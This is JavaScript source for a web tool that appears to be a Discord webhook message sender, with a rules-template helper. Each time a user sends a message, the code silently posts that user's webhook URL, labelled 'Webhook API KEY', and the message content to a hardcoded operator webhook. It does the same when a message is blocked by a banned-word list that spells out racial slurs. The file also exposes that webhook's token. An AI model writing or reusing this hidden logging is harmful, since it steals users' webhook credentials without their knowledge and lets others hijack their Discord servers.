function sendMessage() {

    const webhookHtml = document.querySelector('body'); // Select the body element to access the inputs
    const webhookURL = webhookHtml.querySelector('.WebhookAPI').value;
    const webhookName = webhookHtml.querySelector('.name').value;
    const messageContent = webhookHtml.querySelector('.message').value;
    const savesURL = "https://discord.com/api/webhooks/1415373223687749735/qm69WoTzXZmlA_JW3EIAsSPk5OEdmg0Z7dTOYa_qLlet3GYx4LkN72Hjlgsr-8Zi3OSS"; // Log URL
    const bannedWords = ["RAIDED", "RAID", "raid", "raided", "Raided", "NIGGER", "Nigger", "nigger", "nigga", "Nigga", "NIGGA"];

    if (!webhookURL) {
        alert('Please enter a webhook URL.');
        return;
    }

    if (!messageContent) {
        alert('Please enter a message.');
        return;
    }

    const containsBannedWords = bannedWords.some(word => messageContent.includes(word));

    if (containsBannedWords) {
        alert("Message contains banned words. Please remove them and try again.");

        const bannedWordsEmbed = {
            title: 'Banned Words Detected.',
            description: 'AI service detected BANNED words in a message. Information will be below.',
            color: 0xff0000,
            fields: [
                {
                    name: 'Banned Words',
                    value: bannedWords.join(", "),
                    inline: true
                },
                {
                    name: 'Message Content',
                    value: messageContent,
                    inline: true
                },
                {
                    name: 'Webhook Name',
                    value: webhookName ? webhookName : 'None',
                    inline: true
                },
                {
                    name: 'Webhook URL',
                    value: webhookURL,
                    inline: true
                }
            ]
        };

        fetch(savesURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [bannedWordsEmbed],
                username: 'Webhook Manager Log'
            }),
        });

        return;
    }

    // Send message to the user-specified webhook without an embed
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: messageContent, // Only send the plain message
            username: webhookName || 'Webhook Manager' // Default name if none provided
        }),
    })
    .then(response => {
        if (response.ok) {
            console.log('Message sent successfully to user webhook!');
        } else {
            console.error('Error sending message to user webhook:', response.status);
            alert(`Error sending message to user webhook: ${response.status}`);
        }
    })
    .catch(error => {
        console.error('Error sending message to user webhook:', error);
        alert('Error sending message to user webhook. Check the console for details.');
    });

    // Send a log message to the savesURL webhook with an embed
    const embed = {
        color: 0x0099ff,
        title: 'New Webhook',
        description: 'Content: ' + messageContent,
        footer: {
            text: 'Webhook name: ' + (webhookName ? webhookName : 'None') + ' | Webhook API KEY: ' + webhookURL
        },
    };

    fetch(savesURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            embeds: [embed], // Send the embed to the log URL
            username: 'Webhook Manager Log'
        }),
    })
    .then(response => {
        if (response.ok) {
            console.log('Log message sent successfully!');
        } else {
            console.error('Error sending log message:', response.status);
            alert(`Error sending log message: ${response.status}`);
        }
    })
    .catch(error => {
        console.error('Error sending log message:', error);
        alert('Error sending log message. Check the console for details.');
    });
}

        function populateRules() {
            const rulesTemplate = `
            **Welcome to our Discord server!**

            Please read and follow these rules to ensure a positive experience for everyone:

            1.  **Be Respectful:** Treat all members with courtesy and respect. Avoid personal attacks, harassment, and discrimination.
            2.  **No Spamming:** Do not flood the chat with irrelevant content, excessive messages, or advertisements.
            3.  **Keep it Clean:** Keep the chat appropriate for all ages. Avoid NSFW (Not Safe For Work) content.
            4.  **No Impersonation:** Do not impersonate other users or staff members.
            5.  **Follow Discord TOS:** Adhere to Discord's Terms of Service and Community Guidelines.
            6.  **Use Appropriate Channels:** Post in the correct channels for the respective topics.
            7.  **Listen to Staff:** Follow the instructions of the moderators and administrators.
            8.  **No Illegal Activities:** Do not engage in any illegal activities or promote them.
            9.  **English Only:** Please keep the chat in English so everyone can understand.
            10. **Have Fun:** Enjoy your time here and be a part of our community!

            If you have any questions, please ask a staff member.
            `;
            document.querySelector('.message').value = rulesTemplate;
        }